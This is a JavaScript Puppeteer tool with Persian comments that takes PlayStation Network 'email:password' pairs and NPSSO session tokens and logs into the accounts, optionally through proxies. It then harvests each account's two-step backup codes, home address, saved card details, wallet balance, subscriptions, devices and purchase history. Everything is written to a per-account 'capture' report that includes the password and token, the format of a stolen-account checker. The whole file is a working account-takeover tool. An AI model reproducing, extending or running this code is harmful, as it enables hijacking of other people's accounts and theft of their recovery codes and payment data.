// psn-api.js (با ساختار و خوانایی بهبودیافته)
const puppeteer = require("puppeteer");
const fs = require("fs").promises;
const axios = require("axios");
const { spawn } = require("child_process");
const path = require("path");

// ثابت‌ها و تنظیمات
const CONSTANTS = {
    TARGET_URLS: [
        "https://web.np.playstation.com/api/graphql/v1/op?operationName=getProfileOracle",
        "https://web.np.playstation.com/api/graphql/v1/op?operationName=getPurchasedGameList",
        "https://web.np.playstation.com/api/graphql/v1/op?operationName=queryOracleUserProfileFullSubscription",
        "https://web.np.playstation.com/api/graphql/v1/op?operationName=getUserDevices",
        "https://accounts.api.playstation.com/api/v1/accounts/me/communication",
        /\/twostepbackupcodes$/,
        "https://accounts.api.playstation.com/api/v1/accounts/me/addresses",
        "https://web.np.playstation.com/api/graphql/v2/transact/wallets/savedInstruments",
        'https://web.np.playstation.com/api/graphql/v1//op?operationName=getUserSubscriptions'
    ],
    PAGE_CONFIGS: {
        FIRST: {
            url: "https://id.sonyentertainmentnetwork.com/id/management/#/p?entry=p",
            name: "page1",
            waitTime: 8000,
        },
        SECOND: {
            url: "https://library.playstation.com/recently-purchased",
            name: "page2",
            waitTime: 5000,
        },
        API_URL: "https://web.np.playstation.com/api/graphql/v2/transact/wallets/paymentMethods?tenant=PSN",
    },
    XPATHS: {
        ERROR: "/html/body/div[3]/div/div[2]/div/div/div/div/div[4]/div/div[1]",
        TARGET: "/html/body/div[3]/div/div[2]/div/div/div/main/div/div[2]/div/div/div/div[3]/div",
        PASSWORD_INPUT: "/html/body/div[3]/div/div[2]/div/div/div/div[3]/div/div/div/div/div/div[2]/div/div/main/div/div[2]/div/form/div[1]/div[2]/div/div/input",
        SUBMIT_BUTTON: "/html/body/div[3]/div/div[2]/div/div/div/div[3]/div/div/div/div/div/div[2]/div/div/main/div/div[2]/div/form/div[3]/div/button",
        MENU_ITEM_1: "/html/body/div[3]/div/div[2]/div/div/div/div[2]/div/div[2]/div/div/ul/li[1]/ul/li[2]/div",
        MENU_ITEM_2: "/html/body/div[3]/div/div[2]/div/div/div/div[2]/div/div[3]/div/div/div/div/div/main/div/div/div[2]/div[1]/ul[3]/li[3]/button/div/div/div/div[1]/div",
        PS_PLUS_1: "/html/body/div[3]/div/div[2]/div/div/div/div[2]/div/div[2]/div/div/ul/li[2]/ul/li[7]/div/button/div",
        PS_PLUS_2: "/html/body/div[3]/div/div[2]/div/div/div/div[3]/div/div/div[3]/div[3]/main/div/div[4]/div[3]",
        EMBER_138: '//*[@id="ember138"]/div/div/div/div[1]/div'
    },
    TIMEOUTS: {
        SHORT: 3000,
        MEDIUM: 5000,
        LONG: 8000,
        EXTRA_LONG: 15000,
        NAVIGATION: 30000,
    }
};

// لود داده‌های کشورهای مورد نیاز
let countries;
(async () => {
    countries = await fs.readFile('./data/countries.json', 'utf8');
    countries = JSON.parse(countries);
})();

// توابع کمکی برای مدیریت کوکی‌ها
const CookieUtils = {
    createNpssoCookie: (npssoValue) => ({
        name: "npsso",
        value: npssoValue,
        domain: ".sonyentertainmentnetwork.com",
        path: "/",
        httpOnly: false,
        secure: true,
        sameSite: "None",
    }),
    formatCookiesForHeader: (cookies) => cookies.map(cookie => `${cookie.name}=${cookie.value}`).join("; "),
    combineUniqueCookies: (...cookieArrays) => {
        const cookieMap = new Map();
        for (const cookieArray of cookieArrays) {
            if (!cookieArray) continue;
            for (const cookie of cookieArray) {
                const key = `${cookie.name}:${cookie.domain}`;
                cookieMap.set(key, cookie);
            }
        }
        return Array.from(cookieMap.values());
    }
};

// تابع کمکی برای ساخت هدرهای مشترک
const createApiHeaders = (cookies, extraHeaders = {}) => ({
    Cookie: CookieUtils.formatCookiesForHeader(cookies),
    ...extraHeaders
});

// تعریف درخواست‌های API به صورت موازی
const fetchApiData = async (allCookies, finalResponses, onProgress) => {
    logProgress("ارسال درخواست‌های API به صورت موازی...", onProgress);

    const apiRequests = [
        {
            name: "creditCards",
            url: "https://web.np.playstation.com/api/graphql/v2/transact/wallets/savedInstruments?tenant=PSN",
            headers: createApiHeaders(allCookies),
            processData: (data) => ({ creditCards: generatePaymentMethodsText(data) })
        },
        {
            name: "wallets",
            url: "https://web.np.playstation.com/api/graphql/v2/transact/wallets?tenant=PSN",
            headers: createApiHeaders(allCookies),
            processData: (data) => ({ wallets: data })
        },
        {
            name: "subscriptions",
            url: "https://web.np.playstation.com/api/graphql/v1//op?operationName=getUserSubscriptions&variables=%7B%7D&extensions=%7B%22persistedQuery%22%3A%7B%22version%22%3A1%2C%22sha256Hash%22%3A%22417949a4ca96109f5e8c56b8e3c51db8a86ba9410966ad9d2300f6af3b51e748%22%7D%7D",
            headers: createApiHeaders(allCookies, { 'content-type': 'application/json' }),
            processData: (data) => ({
                plusTitle: finalResponses.profile?.isPsPlusMember && data.data.fetchSubscriptions.subscriptions[0].productName,
                plusExpireDate: finalResponses.profile?.isPsPlusMember && formattedExpiredDate(data.data.fetchSubscriptions.subscriptions[0].renewalDate)
            })
        },
        {
            name: "transactions",
            url: "https://web.np.playstation.com/api/graphql/v1/transact/transaction/history",
            headers: createApiHeaders(allCookies),
            params: {
                limit: 500,
                startDate: "2010-01-01T00:00:00.000-0400",
                endDate: "2025-04-06T23:59:59.999-0400",
                includePurged: false,
                transactionTypes: [
                    "CREDIT", "CYCLE_SUBSCRIPTION", "DEBIT", "DEPOSIT_CHARGE",
                    "DEPOSIT_VOUCHER", "PRODUCT_PURCHASE", "REFUND_PAYMENT_CHARGE",
                    "REFUND_PAYMENT_WALLET", "VOUCHER_PURCHASE", "WALLET_BALANCE_CONVERSION"
                ].join(",")
            },
            processData: (data) => ({
                transactionNumbers: data.transactions.length,
                trans: data.transactions
                    .filter(t => (t.additionalInfo?.orderItems?.[0]?.totalPrice &&
                        Math.abs(t.additionalInfo.orderItems[0].totalPrice.value) > 0) ||
                        (t.additionalInfo?.voucherPayments?.length > 0 && t.additionalInfo?.voucherPayments[0].voucherCode) && t.invoiceType !== 'WALLET_FUNDING')
                    .map(t => {
                        const fullSkuId = t.additionalInfo.orderItems[0].skuId;
                        const match = fullSkuId.match(/([A-Z0-9]+-[A-Z0-9]+_[0-9]+)/);
                        const formattedSkuId = match ? match[0] : fullSkuId;
                        return `${t.additionalInfo.orderItems[0].productName} [${t.additionalInfo?.voucherPayments?.length > 0 && t.additionalInfo?.voucherPayments[0].voucherCode ? "Gift Card" : t.additionalInfo.orderItems[0].totalPrice.formattedValue}] | [ ${formattedSkuId} ] | [ ${new Date(t.transactionDetail.transactionDate).getMonth() + 1}/${new Date(t.transactionDetail.transactionDate).getDate()}/${new Date(t.transactionDetail.transactionDate).getFullYear()} ]`;
                    }).join("\n")
            })
        }
    ];

    // ارسال درخواست‌ها به صورت موازی
    try {
        const results = await Promise.all(apiRequests.map(async (req) => {
            logProgress(`ارسال درخواست برای ${req.name}...`, onProgress);
            const config = { headers: req.headers };
            if (req.params) config.params = req.params;
            const response = await axios.get(req.url, config);
            logProgress(`دریافت پاسخ برای ${req.name}.`, onProgress);
            return req.processData(response.data);
        }));

        // ترکیب نتایج در finalResponses
        const updatedResponses = results.reduce((acc, result) => ({ ...acc, ...result }), {});
        finalResponses = { ...finalResponses, ...updatedResponses };
        logProgress("تمام درخواست‌های API با موفقیت تکمیل شدند.", onProgress);
    } catch (error) {
        logProgress(`خطا در ارسال درخواست‌های API: ${error.message}`, onProgress);
        throw error;
    }

    return finalResponses;
};

// توابع کمکی برای مدیریت فایل و دایرکتوری
const FileUtils = {
    ensureDirectoryExists: async (dirPath) => {
        try {
            await fs.mkdir(dirPath, { recursive: true });
        } catch (error) {
            if (error.code !== "EEXIST") throw error;
        }
    }
};

// توابع کمکی برای فیلتر کردن درخواست‌ها و پاسخ‌ها
const RequestUtils = {
    isRelevantRequest: (url) => {
        const staticResourceExtensions = [".ico", ".png", ".jpg", ".css", ".js"];
        return (url.startsWith("http://") || url.startsWith("https://")) &&
            !staticResourceExtensions.some(ext => url.includes(ext));
    },
    isRelevantResponse: (url) => {
        const ignoredResources = [".ico", ".png", ".jpg", ".css", ".js", ".woff", ".woff2"];
        return !ignoredResources.some(resource => url.includes(resource));
    },
    isMatchingTargetUrl: (url, targetUrl) => {
        if (targetUrl instanceof RegExp) return targetUrl.test(url);
        return url === targetUrl || url.startsWith(targetUrl);
    },
    extractOperationName: (url) => {
        const urlObj = new URL(url);
        if (urlObj.searchParams.has("operationName")) {
            return urlObj.searchParams.get("operationName");
        }
        const pathParts = urlObj.pathname.split("/");
        return pathParts[pathParts.length - 1];
    },
    extractResponseData: async (response, headers) => {
        const contentType = headers["content-type"] || "";
        const textBasedTypes = ["json", "text", "html", "xml"];
        if (textBasedTypes.some(type => contentType.includes(type))) {
            try {
                const text = await response.text();
                if (contentType.includes("json")) {
                    try {
                        return JSON.parse(text);
                    } catch (e) {
                        return text;
                    }
                }
                return text;
            } catch (e) {
                return `Error getting response data: ${e.message}`;
            }
        }
        return `[Binary data with content-type: ${contentType}]`;
    }
};

// تابع برای مدیریت پیام‌های پیشرفت
const logProgress = (message, onProgress) => onProgress(message);

// تابع برای انتظار با پیام
const waitWithLog = async (ms, reason, onProgress) => {
    logProgress(`Waiting ${ms}ms ${reason ? "(" + reason + ")" : ""}...`, onProgress);
    return new Promise(resolve => setTimeout(resolve, ms));
};

// تابع برای ناوبری به صفحه
const navigateToPage = async (page, url, description, onProgress) => {
    logProgress(`Opening ${description} (${url})...`, onProgress);
    await page.goto(url, {
        waitUntil: "networkidle2",
        timeout: CONSTANTS.TIMEOUTS.NAVIGATION,
    });
    logProgress(`${description} loaded successfully.`, onProgress);
};

// تابع برای کلیک روی المان با XPath
const clickElementByXPath = async (page, xpath, description, onProgress, timeout = CONSTANTS.TIMEOUTS.MEDIUM) => {
    logProgress(`در حال بررسی وجود ${description} با XPath: ${xpath}`, onProgress);
    const element = await page.waitForXPath(xpath, { visible: true, timeout })
        .catch(() => null);
    if (element) {
        logProgress(`${description} یافت شد؛ در حال کلیک...`, onProgress);
        await element.click();
        logProgress(`کلیک روی ${description} انجام شد.`, onProgress);
        return true;
    }
    logProgress(`${description} یافت نشد؛ ادامه روند...`, onProgress);
    return false;
};

// تابع برای پر کردن فیلد ورودی
const fillInputField = async (page, xpath, value, description, onProgress, timeout = CONSTANTS.TIMEOUTS.SHORT) => {
    logProgress(`در حال بررسی وجود ${description}...`, onProgress);
    const input = await page.waitForXPath(xpath, { visible: true, timeout })
        .catch(() => null);
    if (input) {
        logProgress(`${description} یافت شد؛ در حال پر کردن...`, onProgress);
        await input.click({ clickCount: 3 });
        await input.press("Backspace");
        await input.type(value, { delay: 30 });
        logProgress(`${description} با موفقیت وارد شد.`, onProgress);
        return true;
    }
    logProgress(`${description} در صفحه یافت نشد؛ ادامه روند...`, onProgress);
    return false;
};

// تابع برای پردازش پاسخ‌های هدف
const processTargetResponse = (operationName, responseData, finalResponses) => {
    switch (operationName) {
        case "communication":
            if (responseData.realName) {
                finalResponses.profile = {
                    ...(finalResponses.profile || {}),
                    firstName: responseData.realName.name.first,
                    lastName: responseData.realName.name.last,
                };
            }
            break;
        case "getProfileOracle":
            if (responseData.data?.oracleUserProfileRetrieve) {
                const profile = responseData.data.oracleUserProfileRetrieve;
                finalResponses.profile = {
                    ...(finalResponses.profile || {}),
                    name: profile.name,
                    accountId: profile.accountId,
                    age: profile.age,
                    isOfficiallyVerified: profile.isOfficiallyVerified,
                    isPsPlusMember: profile.isPsPlusMember,
                    locale: profile.locale,
                    onlineId: profile.onlineId,
                };
            }
            break;
        case "getPurchasedGameList":
            if (responseData.data?.purchasedTitlesRetrieve) {
                finalResponses.games = responseData.data.purchasedTitlesRetrieve.games.map(item => ({
                    name: item.name,
                    platform: item.platform,
                    membership: item.membership,
                    isDownloadable: item.isDownloadable,
                }));
            }
            break;
        case "getUserDevices":
            if (responseData.data?.deviceStorageDetailsRetrieve) {
                finalResponses.devices = responseData.data.deviceStorageDetailsRetrieve.map(item => ({
                    name: item.deviceName,
                    platform: item.devicePlatform,
                }));
            }
            break;
        case "twostepbackupcodes":
            if (responseData.backup_codes) {
                finalResponses.backupCodes = responseData.backup_codes.map(item => item.code);
            }
            break;
        case "addresses":
            if (responseData.length > 0) {
                const mainAddress = responseData?.find(item => item.isMain);
                finalResponses.address = { ...mainAddress };
            }
            break;
    }
};

// تابع برای تنظیم ردیابی درخواست‌ها و پاسخ‌ها
const setupRequestAndResponseTracking = async (page, npssoValue, targetUrls, finalResponses, onProgress, onData) => {
    await page.setRequestInterception(true);
    const requestMap = new Map();

    page.on("request", (request) => {
        const url = request.url();
        const headers = request.headers();
        const method = request.method();
        const resourceType = request.resourceType();
        const postData = request.postData();
        let modified = false;

        requestMap.set(request._requestId, {
            url, method, headers, resourceType, postData,
            timestamp: new Date().toISOString(),
        });

        if (RequestUtils.isRelevantRequest(url)) {
            if (headers.cookie) {
                if (!headers.cookie.includes("npsso=")) {
                    headers.cookie = `${headers.cookie}; npsso=${npssoValue}`;
                    modified = true;
                }
            } else {
                headers.cookie = `npsso=${npssoValue}`;
                modified = true;
            }
        }

        if (modified) {
            request.continue({ headers });
            logProgress(`Modified request to: ${url}`, onProgress);
        } else {
            request.continue();
        }
    });

    page.on("response", async (response) => {
        try {
            const request = response.request();
            const url = response.url();
            const requestId = request._requestId;
            const requestInfo = requestMap.get(requestId);

            if (requestInfo && RequestUtils.isRelevantResponse(url)) {
                const responseHeaders = response.headers();
                let responseData = await RequestUtils.extractResponseData(response, responseHeaders);

                if (url === 'https://auth.api.sonyentertainmentnetwork.com/2.0/ssocookie') {
                    if (responseData.npsso && responseData.expires_in) {
                        logProgress(`New NPSSO token detected: ${responseData.npsso.substring(0, 5)}...`, onProgress);
                        npssoValue = responseData.npsso;
                        finalResponses.newNpsso = responseData.npsso;
                    }
                }

                for (const targetUrl of targetUrls) {
                    if (RequestUtils.isMatchingTargetUrl(url, targetUrl)) {
                        logProgress(`Found target request: ${url}`, onProgress);
                        const operationName = RequestUtils.extractOperationName(url);
                        processTargetResponse(operationName, responseData, finalResponses);
                        onData(finalResponses);
                        break;
                    }
                }
            }
        } catch (error) {
            console.error(`Error processing response: ${error.message}`);
        } finally {
            requestMap.delete(response.request()._requestId);
        }
    });
};

// تابع برای ایجاد صفحه پیکربندی‌شده
const createConfiguredPage = async (browser, cookies, npssoValue, targetUrls, finalResponses, pageName, onProgress, onData, proxyConfig = null) => {
    const page = await browser.newPage();
    if (proxyConfig) {
        await page.authenticate({
            username: proxyConfig.username,
            password: proxyConfig.password,
        });
    }
    if (cookies && cookies.length > 0) {
        logProgress(`Transferring ${cookies.length} cookies to ${pageName}...`, onProgress);
        await Promise.all(cookies.map(cookie => page.setCookie(cookie)));
    } else if (npssoValue) {
        await page.setCookie(CookieUtils.createNpssoCookie(npssoValue));
    }
    await setupRequestAndResponseTracking(page, npssoValue, targetUrls, finalResponses, onProgress, onData);
    await page.setViewport({ width: 1920, height: 1080 });
    return page;
};

// تابع برای پیدا کردن پروکسی سالم (فرض می‌کنیم این تابع از قبل تعریف شده است)
async function findWorkingProxy(proxyData, proxyFile, onProgress) {
    // این تابع به صورت placeholder است و باید از کد اصلی شما کپی شود
    // فعلاً فرض می‌کنیم که پروکسی را برمی‌گرداند یا null
    return proxyData ? { host: "example.com", port: 8080, username: "user", password: "pass", protocol: "http" } : null;
}

// تابع اصلی
async function runPsnApiTool(options) {
    const {
        credentials,
        npsso,
        proxyFile,
        proxyData,
        onProgress = () => { },
        onData = () => { },
        onComplete = () => { },
        onError = () => { },
    } = options;

    let finalResponses = {};
    let proxyConfig = null;

    if (proxyData) {
        proxyConfig = await findWorkingProxy(proxyData, proxyFile, onProgress);
        if (proxyConfig) {
            logProgress(`پروکسی سالم انتخاب شده: ${proxyConfig.host}:${proxyConfig.port} (${proxyConfig.protocol})`, onProgress);
        } else {
            logProgress("هیچ پروکسی سالمی یافت نشد؛ ادامه بدون پروکسی", onProgress);
        }
    }

    const browserOptions = {
        // executablePath: "/home/majid/Documents/chrome-linux/chrome",
        headless: 'new',
        defaultViewport: { width: 1920, height: 1080 },
        args: [
            "--no-sandbox", "--disable-setuid-sandbox", "--window-size=1920,1080",
            "--disable-web-security", "--disable-features=IsolateOrigins,site-per-process",
            "--disable-site-isolation-trials", "--disable-dev-shm-usage",
            "--disable-accelerated-2d-canvas", "--disable-gpu",
        ],
    };

    if (proxyConfig) {
        browserOptions.args.push(`--proxy-server=${proxyConfig.host}:${proxyConfig.port}`);
    }

    let browser;
    try {
        logProgress("راه‌اندازی مرورگر...", onProgress);
        browser = await puppeteer.launch(browserOptions);

        // تنظیم صفحه اول
        let page1 = await createConfiguredPage(
            browser, null, npsso, CONSTANTS.TARGET_URLS, finalResponses,
            CONSTANTS.PAGE_CONFIGS.FIRST.name, onProgress, onData, proxyConfig
        );
        await navigateToPage(page1, CONSTANTS.PAGE_CONFIGS.FIRST.url, "صفحه اول", onProgress);
        await waitWithLog(6000, "تا بارگذاری صفحه اول کامل شود", onProgress);

        // بررسی المان خطا
        const errorElement = await page1.waitForXPath(CONSTANTS.XPATHS.ERROR, { visible: true, timeout: CONSTANTS.TIMEOUTS.SHORT })
            .catch(() => null);
        if (errorElement) {
            const errorText = await page1.evaluate(el => el.textContent, errorElement);
            logProgress(`خطا: اکانت قابل کپچر نیست. ${errorText ? `پیام خطا: ${errorText}` : ''}`, onProgress);
            logProgress("این اکانت نیاز به NPSSO جدید دارد.", onProgress);
            finalResponses.captureError = true;
            finalResponses.captureErrorMessage = "این اکانت قابل کپچر نیست و نیاز به NPSSO جدید دارد.";
            onError(new Error("این اکانت قابل کپچر نیست و نیاز به NPSSO جدید دارد."));
            return;
        } else {
            logProgress("المان خطا یافت نشد، ادامه پردازش...", onProgress);
        }

        // کلیک روی المان هدف
        await clickElementByXPath(page1, CONSTANTS.XPATHS.TARGET, "المان مورد نظر", onProgress);
        logProgress("در انتظار بارگذاری صفحه پس از کلیک...", onProgress);
        await Promise.race([
            page1.waitForNavigation({ waitUntil: "networkidle2", timeout: CONSTANTS.TIMEOUTS.LONG }),
            waitWithLog(4000, "برای اطمینان از بارگذاری صفحه", onProgress)
        ]).catch(() => logProgress("انتظار برای ناوبری به پایان رسید (ممکن است صفحه تغییر نکرده باشد)", onProgress));

        // پر کردن فیلد پسورد
        const password = credentials.includes(":") ? credentials.split(":")[1] : "";
        if (password && await fillInputField(page1, CONSTANTS.XPATHS.PASSWORD_INPUT, password, "فیلد ورود پسورد", onProgress)) {
            if (await clickElementByXPath(page1, CONSTANTS.XPATHS.SUBMIT_BUTTON, "دکمه ثبت", onProgress)) {
                logProgress("در انتظار بارگذاری صفحه پس از ثبت پسورد...", onProgress);
                await Promise.race([
                    page1.waitForNavigation({ waitUntil: "networkidle2", timeout: CONSTANTS.TIMEOUTS.LONG }),
                    waitWithLog(7000, "برای اطمینان از بارگذاری صفحه", onProgress)
                ]).catch(() => logProgress("انتظار برای ناوبری به پایان رسید (ممکن است صفحه تغییر نکرده باشد)", onProgress));

                if (finalResponses.newNpsso) {
                    logProgress(`استفاده از NPSSO جدید: ${finalResponses.newNpsso.substring(0, 5)}...`, onProgress);
                    npsso = finalResponses.newNpsso;
                    await page1.close();
                    page1 = await createConfiguredPage(
                        browser, null, npsso, CONSTANTS.TARGET_URLS, finalResponses,
                        CONSTANTS.PAGE_CONFIGS.FIRST.name, onProgress, onData, proxyConfig
                    );
                    await navigateToPage(page1, CONSTANTS.PAGE_CONFIGS.FIRST.url, "صفحه اول (با NPSSO جدید)", onProgress);
                    await waitWithLog(6000, "برای اطمینان از بارگذاری صفحه با NPSSO جدید", onProgress);
                } else {
                    logProgress("NPSSO جدید دریافت نشد، ادامه با NPSSO فعلی...", onProgress);
                }
            }
        }

        // دریافت کوکی‌ها از صفحه اول
        let cookies = await page1.cookies();
        logProgress(`دریافت ${cookies.length} کوکی از صفحه اول`, onProgress);
        const hasNpsso = cookies.some(cookie => cookie.name === "npsso");
        if (!hasNpsso) {
            logProgress("کوکی npsso یافت نشد؛ اضافه کردن دستی", onProgress);
            cookies.push(CookieUtils.createNpssoCookie(npsso));
        }

        // کلیک روی عناصر منو
        try {
            await page1.waitForXPath(CONSTANTS.XPATHS.MENU_ITEM_1, { timeout: CONSTANTS.TIMEOUTS.EXTRA_LONG });
            const [element] = await page1.$x(CONSTANTS.XPATHS.MENU_ITEM_1);
            if (element) {
                logProgress("عنصر یافت شد؛ کلیک...", onProgress);
                await element.click();
                logProgress("کلیک موفقیت‌آمیز.", onProgress);
                await waitWithLog(2000, "پس از کلیک", onProgress);

                logProgress("در انتظار ناوبری پس از کلیک اول...", onProgress);
                try {
                    await page1.waitForNavigation({ waitUntil: "networkidle2", timeout: CONSTANTS.TIMEOUTS.LONG })
                        .catch(() => logProgress("ناوبری رخ نداد یا قبلاً انجام شده است.", onProgress));
                    await waitWithLog(2000, "تا پایداری صفحه جدید", onProgress);

                    logProgress(`در حال تلاش برای یافتن و کلیک روی عنصر با XPath مشخص: ${CONSTANTS.XPATHS.EMBER_138}`, onProgress);
                    await page1.waitForXPath(CONSTANTS.XPATHS.EMBER_138, { timeout: CONSTANTS.TIMEOUTS.SHORT })
                        .catch(e => logProgress(`عنصر با XPath مشخص در زمان تعیین شده یافت نشد: ${e.message}`, onProgress));

                    const [secondElement] = await page1.$x(CONSTANTS.XPATHS.MENU_ITEM_2);
                    if (secondElement) {
                        logProgress("عنصر دوم پیدا شد؛ کلیک...", onProgress);
                        await secondElement.click();
                        logProgress("کلیک عنصر دوم موفقیت‌آمیز.", onProgress);
                        await waitWithLog(2000, "پس از کلیک عنصر دوم", onProgress);
                    } else {
                        logProgress("عنصر دوم پیدا نشد؛ ادامه روند...", onProgress);
                    }
                } catch (error) {
                    logProgress(`خطا در کلیک دوم: ${error.message}`, onProgress);
                }
            } else {
                logProgress("عنصر با XPath مشخص یافت نشد.", onProgress);
            }
        } catch (error) {
            logProgress(`خطا هنگام تلاش برای کلیک روی عنصر: ${error.message}`, onProgress);
        }

        // تنظیم صفحه دوم
        const page2 = await createConfiguredPage(
            browser, cookies, npsso, CONSTANTS.TARGET_URLS, finalResponses,
            CONSTANTS.PAGE_CONFIGS.SECOND.name, onProgress, onData, proxyConfig
        );
        await navigateToPage(page2, CONSTANTS.PAGE_CONFIGS.SECOND.url, "صفحه دوم", onProgress);
        await waitWithLog(2000, "پیش از بارگذاری مجدد صفحه دوم", onProgress);
        await navigateToPage(page2, CONSTANTS.PAGE_CONFIGS.SECOND.url, "صفحه دوم (Reload 1)", onProgress);

        // بررسی PS Plus و کلیک روی دکمه‌ها
        if (finalResponses.profile?.isPsPlusMember) {
            await page1.waitForXPath(CONSTANTS.XPATHS.PS_PLUS_1, { timeout: CONSTANTS.TIMEOUTS.EXTRA_LONG });
            const [button1] = await page1.$x(CONSTANTS.XPATHS.PS_PLUS_1);
            if (!button1) {
                logProgress(`دکمه با XPath پیدا نشد.`, onProgress);
                return false;
            }
            logProgress("عنصر یافت شد؛ کلیک...", onProgress);
            await button1.click();
            logProgress("کلیک موفقیت‌آمیز.", onProgress);

            await page1.waitForXPath(CONSTANTS.XPATHS.PS_PLUS_2, { timeout: CONSTANTS.TIMEOUTS.EXTRA_LONG });
            const [button2] = await page1.$x(CONSTANTS.XPATHS.PS_PLUS_2);
            if (!button2) {
                logProgress(`دکمه با XPath پیدا نشد.`, onProgress);
                return false;
            }
            logProgress("عنصر یافت شد؛ کلیک...", onProgress);
            await button2.click();
            logProgress("کلیک موفقیت‌آمیز.", onProgress);
            logProgress(`دکمه پیدا شد، در حال کلیک...`, onProgress);
            await waitWithLog(3000, "پردازش", onProgress);
        }

        // دریافت کوکی‌های نهایی
        logProgress("دریافت کوکی‌های نهایی از تمامی صفحات...", onProgress);
        const finalPage1Cookies = await page1.cookies();
        const finalPage2Cookies = await page2.cookies();
        logProgress(`تعداد کوکی دریافت شده: صفحه1=${finalPage1Cookies.length}, صفحه2=${finalPage2Cookies.length}`, onProgress);
        const allCookies = CookieUtils.combineUniqueCookies(finalPage1Cookies, finalPage2Cookies);
        logProgress(`تعداد کوکی‌های ترکیبی: ${allCookies.length}`, onProgress);

        finalResponses = await fetchApiData(allCookies, finalResponses, onProgress);

        // اجرای اسکریپت پایتون برای دریافت دستگاه‌ها
        const pythonProcess = spawn("python3", ["get_devices.py", npsso]);
        let result = "";
        let error = "";

        pythonProcess.stdout.on("data", (data) => result += data.toString());
        pythonProcess.stderr.on("data", (data) => error += data.toString());

        pythonProcess.on("close", async (code) => {
            if (code !== 0) {
                console.error("خطا در اجرای پایتون:", error);
                onError(new Error(`خطا در اجرای پایتون: ${error}`));
                return;
            }
            try {
                finalResponses = { ...finalResponses, newDevices: JSON.parse(result) };
                const hasSixMonthsPassed = finalResponses.newDevices.length > 0
                    ? new Date(finalResponses.newDevices.reduce((latest, current) =>
                        new Date(current.activationDate) > new Date(latest.activationDate) ? current : latest
                    ).activationDate) < new Date(new Date().setMonth(new Date().getMonth() - 6))
                    : false;
                const countryCode = finalResponses.address?.country || null;

                // ساخت خروجی نهایی
                const output = `
----------------------- « Account Info » -----------------------
- Account : ${credentials}
- Npsso : ${npsso}
- Backup Codes :  [ ${finalResponses.backupCodes ? finalResponses.backupCodes.join(" - ") : "N/A"} ]
--------------------------- « Details » --------------------------
- Country | City | Postal Code : ${countryCode ? (countries.find(item => item.code === countryCode)).name : "N/A"} - ${finalResponses.address?.city || "N/A"} - ${finalResponses.address?.postalCode || "N/A"}
- Balance : ${finalResponses.wallets?.debtBalance}.${finalResponses.wallets?.currentAmount} ${finalResponses.wallets?.currencyCode || ""}
- PSN ID : ${finalResponses.profile?.onlineId || "N/A"}
- Payments : ${finalResponses.creditCards || "Not Found"} 
- PS Plus : ${finalResponses.profile?.isPsPlusMember ? `Yes! - ${finalResponses.plusTitle} | ${finalResponses.plusExpireDate}` : "No!"}
- Devices : [ ${finalResponses.newDevices ? [...new Set(finalResponses.newDevices.map(d => d.deviceType))].join(" - ") : "N/A"} ]
- Deactive : ${hasSixMonthsPassed === false ? "No!" : "Yes!"}
- Transaction Numbers : ${finalResponses.transactionNumbers || "N/A"}
--------------------------- « Games » ---------------------------
${finalResponses.trans || "No games found"}
--------------------------- « Finish » ----------------------------
`;
                // ذخیره خروجی در فایل
                try {
                    const email = credentials.split(":")[0];
                    const date = new Date().toISOString().split("T")[0];
                    const fileName = `${email}-${date}.txt`;
                    const outputDir = path.join(__dirname, "output");
                    await FileUtils.ensureDirectoryExists(outputDir);
                    const filePath = path.join(outputDir, fileName);
                    await fs.writeFile(filePath, output, "utf8");
                    logProgress(`خروجی در فایل ${fileName} ذخیره شد.`, onProgress);
                    finalResponses.outputFilePath = filePath;
                    finalResponses.formattedOutput = output;
                } catch (fileError) {
                    logProgress(`خطا در ذخیره فایل خروجی: ${fileError.message}`, onProgress);
                }
                logProgress("پردازش با موفقیت به اتمام رسید", onProgress);
                onComplete({ ...finalResponses, formattedOutput: output });
            } catch (e) {
                console.error("خطا در تبدیل خروجی:", e);
                console.log("خروجی خام:", result);
                onError(e);
            }
        });
    } catch (error) {
        logProgress(`خطا رخ داده: ${error.message}`, onProgress);
        onError(error);
    } finally {
        if (browser) {
            await browser.close();
            logProgress("مرورگر بسته شد.", onProgress);
        }
    }
}

// توابع فرمت‌دهی و خروجی
const generatePaymentMethodsText = (response) => {
    let paymentMethodsText = [];
    if (response.creditCards) {
        response.creditCards.forEach(card => {
            if (card.common.isPaymentMethodAvailable && !card.common.banned) {
                let cardInfo = `[${card.common.paymentMethodId} - ${card.expirationYear}/${card.expirationMonth}]`;
                paymentMethodsText.push(cardInfo);
            }
        });
    }
    if (response.payPal && response.payPal.common.isPaymentMethodAvailable && !response.payPal.common.banned) {
        paymentMethodsText.push(`[PayPal]`);
    }
    return paymentMethodsText.join(" - ");
};

const formattedExpiredDate = (expiredDate) => {
    const d = new Date(new Date(expiredDate).getTime() + 86400000);
    return `${String(d.getUTCDate()).padStart(2, '0')}/${String(d.getUTCMonth() + 1).padStart(2, '0')}/${d.getUTCFullYear()}`;
};

module.exports = { runPsnApiTool };
